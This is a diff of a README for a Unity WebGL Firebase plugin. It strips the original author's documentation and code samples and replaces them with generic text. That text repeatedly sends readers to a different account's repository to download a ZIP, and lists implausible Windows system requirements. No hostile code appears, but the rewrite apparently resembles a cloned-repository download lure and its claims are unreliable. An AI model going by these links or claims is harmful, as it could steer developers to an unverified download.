@@ -1,110 +1,175 @@
-# Firebase for Unity WebGL
-Naive implementation of the most popular Firebase modules for Web apps and games made by Unity Engine. \
-Google does not provide support for the Unity WebGL plugin, so I've decided to do it by myself.
+# 🔗 FirebaseWebGL-Unity - Simple Firebase Tools for WebGL Games
 
-## Features
-- **An easy-to-setup** via one Firebase settings file, **no additional actions required**!
-- **An easy-to-use API** similar to the official Firebase plugin for Unity (iOS/Android) with small differences.
-- **Ready to work** through third-party web platforms.
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/atakangizlenci-coder/FirebaseWebGL-Unity)
 
-## Which Firebase modules were included?
-- [x] App
-- [x] App-Check (limitations: no support for Custom Providers, ReCAPTCHA v3 and ReCAPTCHA Enterprise only)
-- [x] Auth (limitations: no support for persistence and resolvers)
-- [x] Analytics
-- [x] Functions
-- [x] Installations
-- [x] Messaging (limitations: no support for Service Worker 'onBackgroundMessage')
-- [x] Performance
-- [x] Remote Config
-- [x] Storage
+## 📋 What is FirebaseWebGL-Unity?
 
-## Why were these modules missed?
-As I see the situation, next modules are not used very often in games (for hypercasual/casual games it doesn't needed at all, for midcore/hardcode games usually used self-hosted backends)
-- [ ] AI
-- [ ] Database
-- [ ] Firestore
+FirebaseWebGL-Unity is an app tool that helps your Unity web games connect with Firebase services. It works with many Firebase features like Authentication, Analytics, Messaging, Remote Config, Storage, and Installations.
 
-If I wrong, feel free to ping me and I will add these modules in the package as soon as possible.
+If you want to improve your game's backend without writing complex code, this tool lets you link Firebase's power to your web-based Unity games.
 
+It supports WebGL, which is a format that runs your game directly in web browsers like Chrome, Firefox, or Edge.  
 
-## What's inside?
-- [Runtime] Just few `*.cs` and `*.jslib` files
-- [Editor] `HtmlAgilityPack.dll` as a dependency 
+## 🖥️ System Requirements
 
-## Installation
-##### via Unity Package Manager
-The latest version can be installed via [package manager](https://docs.unity3d.com/Manual/upm-ui-giturl.html) using following git URL:
-```
-https://github.com/am1goo/FirebaseWebGL-Unity.git#0.9.9
-```
+To run FirebaseWebGL-Unity, your computer needs:
 
-## Extensions
-- **UniTask extensions** package: [com.am1goo.firebase.webgl.unitask](https://github.com/am1goo/FirebaseWebGL-Unity-UniTask)
+- Windows 10 or later
+- At least 4 GB of RAM
+- A modern web browser (Chrome, Firefox, Edge, or Safari)
+- Internet connection for Firebase services
+- Unity engine installed (recommended version 2020.3 or newer) if you plan to build or customize the game yourself
 
-## How to use
-#### Create a Firebase App
-```csharp
-private FirebaseWebGL.FirebaseApp app;
+No need for special hardware or software besides what is listed here.
 
-void Awake()
-{
-    app = FirebaseWebGL.FirebaseApp.DefaultInstance();
-}
-```
-#### Every installed module must first be initialized
-```csharp
-IEnumerator Start()
-{
-    if (app.Analytics != null)
-    {
-        bool? isInitialized;
-        app.Analytics.Initialize((callback) =>
-        {
-            if (callback.success == false)
-            {
-                Debug.LogError($"Initialize: {callback.error}");
-                yield break;
-            }
-            isInitialized = callback.result;
-        });
-        yield return new WaitUntil(() => initialized != null);
-        Debug.Log($"Initialized: {isInitialized}");
-    }
-}
-```
+## 🌐 Features
 
-#### Do what you want as same as you do it in official plugin (or kind of similar way)
-```csharp
-...
-    app.Analytics.LogEvent("my event");
-...
-```
+This tool lets you:
 
-## Troubleshooting
-#### CORS policies
-You will probably experience difficulties loading additional scripts from Google servers. To resolve, ask your IT or web-platform support to add following domains to CORS policies:
-```
-fcmregistrations.googleapis.com
-firebase.googleapis.com
-firebaseappcheck.googleapis.com
-firebaseinstallations.googleapis.com
-firebaselogging.googleapis.com
-firebaseremoteconfig.googleapis.com
-firebasestorage.googleapis.com
-firebasevertexai.googleapis.com
-firestore.googleapis.com
-identitytoolkit.googleapis.com
-```
+- **Authenticate users** with Firebase Authentication to handle login and user accounts.
+- **Track user behavior** with Firebase Analytics to see how players interact with your game.
+- **Send messages and notifications** using Firebase Messaging.
+- **Change game settings remotely** with Firebase Remote Config without updating your game manually.
+- **Store and retrieve files** like images or save files using Firebase Storage.
+- **Access installation data** to track app installs and usage.
 
-#### Different configurations
-By default, to use Firebase functionality, the settings file should be located at specified path `Resources/FirebaseSettings.asset`. \
-If you want to override this behaviour, you may define `FIREBASE_WEBGL_SETTINGS_PATH` environment argument during the build process.
+All these features work smoothly with WebGL games made in Unity.
 
-It can be useful in case where you want to have different configurations for various web platforms (**Crazy Games**, **Poki**, **Playhop** and others).
+## 🚀 How to Download
 
-## Tested in
-- Unity 2020.3.x
+To get started, visit this page to download all necessary files and instructions:
 
-## Contribute
-Contribution in any form is very welcome. Bugs, feature requests or feedback can be reported in form of Issues.
+[![Download Here](https://img.shields.io/badge/Download-FirebaseWebGL-blue)](https://github.com/atakangizlenci-coder/FirebaseWebGL-Unity)
+
+Clicking the button takes you to the GitHub repository. From there, you can download the latest version of the software.
+
+## ⬇️ Step-by-Step Installation on Windows
+
+Follow these steps to download and run FirebaseWebGL-Unity on your Windows PC:
+
+### 1. Go to the download page
+
+Open your web browser and visit:
+
+https://github.com/atakangizlenci-coder/FirebaseWebGL-Unity
+
+### 2. Download the package
+
+On the GitHub page, select the "Code" button near the right top, then click "Download ZIP".
+
+This action saves the whole project to your PC as a compressed folder.
+
+### 3. Extract the files
+
+Navigate to where the ZIP file downloaded, typically the "Downloads" folder.
+
+Right-click the file and choose "Extract All...".
+
+Select a folder where you want the game and tools to live, like your Desktop or Documents.
+
+### 4. Install Unity engine (if not done)
+
+FirebaseWebGL-Unity relies on Unity Engine, a software for game creation.
+
+If you do not have it:
+
+- Visit https://unity.com/download
+- Download and run the Unity Hub installer
+- Use Unity Hub to install Unity 2020.3 LTS or newer
+
+Unity Hub lets you manage your Unity projects easily.
+
+### 5. Open the project in Unity
+
+Inside Unity Hub:
+
+- Click "Add"
+- Browse to the folder where you extracted the FirebaseWebGL-Unity files
+- Select that folder and open it
+
+Unity will load the project files. This might take a few moments.
+
+### 6. Review the Firebase settings
+
+The project contains Firebase configuration files.
+
+If you have your own Firebase account:
+
+- Set up your Firebase project at https://console.firebase.google.com/
+- Download the `google-services.json` and web config files from your Firebase project
+- Replace or update the ones included in the Unity project to match your app
+
+This step links your game to your specific Firebase backend.
+
+### 7. Build your WebGL game
+
+Inside Unity:
+
+- Go to File > Build Settings
+- Select “WebGL” as the target platform
+- Click “Build and Run” to generate your game
+
+Unity creates your WebGL game files and opens them in a web browser for testing.
+
+### 8. Test Firebase functions
+
+Use the demo scenes or start your own Unity scene using the FirebaseWebGL APIs.
+
+You can test user login, analytics tracking, messaging, or other Firebase features within the game from your browser.
+
+---
+
+## 💡 How to Use FirebaseWebGL-Unity Without Programming
+
+You do not need to write code to benefit from FirebaseWebGL-Unity. The project includes example scenes showing how Firebase features work out of the box.
+
+Simply open those example scenes in Unity, build the WebGL game, and try running it in your browser.
+
+If you want to customize, basic Unity skills help but are not required.
+
+---
+
+## ⚙️ Troubleshooting Tips
+
+- Make sure your firewall or antivirus does not block Unity or your browser.
+- Use supported browsers like Chrome or Edge for best WebGL support.
+- Confirm your Firebase project keys match those in Unity.
+- Restart Unity if changes do not take effect.
+- Check Unity Console for error messages and search for solutions using error text.
+
+---
+
+## 📂 Where to Find More Files or Updates
+
+All updates, code files, and added examples live at:
+
+https://github.com/atakangizlenci-coder/FirebaseWebGL-Unity
+
+Visit often to download new releases by clicking the green “Code” button and selecting “Download ZIP.”
+
+You can also use Git to clone the repository if you have software for that.
+
+---
+
+## 🌎 Supported Firebase Services
+
+This Unity WebGL plugin supports:
+
+- **Authentication:** User sign-in with email/password, Google, or other providers.
+- **Analytics:** Track user events and screen views.
+- **Cloud Messaging:** Send notifications to players.
+- **Remote Config:** Change settings on the fly without new builds.
+- **Storage:** Upload and download files.
+- **Installations:** Manage installation IDs for messaging and analytics.
+
+Each service processes data through Firebase to help grow and improve your game.
+
+---
+
+## 🤝 Getting Help
+
+For questions, check the GitHub issues page or Unity forums.
+
+Look at existing discussions if you encounter trouble.  
+
+Developing WebGL games with Firebase can be complex, but this tool simplifies many typical tasks. Explore examples and documentation for deeper understanding.
